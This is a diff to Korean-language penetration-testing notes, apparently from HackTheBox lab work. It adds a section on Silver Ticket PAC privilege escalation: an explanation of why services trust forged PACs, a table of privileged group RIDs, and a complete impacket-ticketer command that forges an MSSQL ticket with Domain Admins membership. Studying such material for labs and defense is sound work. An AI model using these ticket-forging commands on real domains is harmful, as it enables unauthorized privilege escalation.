@@ -978,6 +978,7 @@ gpupdate /force
 <details>
   <summary><strong>Silver Ticket</strong></summary>
 
+## 티켓 발행
 - `GetUserSPNs`를 사용하여 `SPN`이 등록되어 있는지 확인 필요.
 - `NTLM(password to ntlm)`과 `SID` 필요.
 - `groups`옵션을 사용하여 해당 그룹의 권한을 획득할 수 있음.
@@ -992,5 +993,43 @@ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-408842
 
 KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k <FQDN>
 ```
-  
+
+## PAC 권한 상승
+- https://vuln.dev/silver-ticket-mssql-clr/
+
+### PAC(Privilege Attribute Certificate)이란?
+- PAC은 Kerberos 티켓 안에 포함된 **사용자의 그룹 멤버십 및 권한 정보**입니다.
+
+### Silver Ticket에서 PAC이 중요한 이유
+- Silver Ticket은 **서비스 계정의 NTLM 해시로 TGS(서비스 티켓)를 위조**하는 공격입니다.
+- 서비스는 티켓을 받으면 KDC에 다시 물어보지 않고, **자신이 복호화할 수 있으면 유효한 티켓으로 간주**합니다. 이 구조적 허점이 PAC 조작을 가능하게 합니다.
+```
+Silver Ticket 위조
+↓
+PAC에 임의 그룹(admin 등) 삽입
+↓
+서비스 계정 해시로 암호화
+↓
+서비스(MSSQL 등)가 자신의 해시로 복호화
+↓
+KDC에 검증 요청 없이 PAC 내용을 그대로 신뢰
+↓
+공격자가 넣은 그룹 멤버로 인식
+```
+
+### 주요 그룹 RID 목록
+
+| RID | 그룹 | 권한 |
+|---|---|---|
+| 512 | Domain Admins | 도메인 최고 권한 |
+| 513 | Domain Users | 기본 도메인 멤버 |
+| 518 | Schema Admins | 스키마 관리 |
+| 519 | Enterprise Admins | 포레스트 전체 권한 |
+| 1105~ | 커스텀 그룹 | 도메인마다 다름 (enum_logins로 확인) |
+
+### 권한 상승
+```bash
+impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -user-id 1103 -groups '512,1105' doesntmatter
+```
+
 </details>
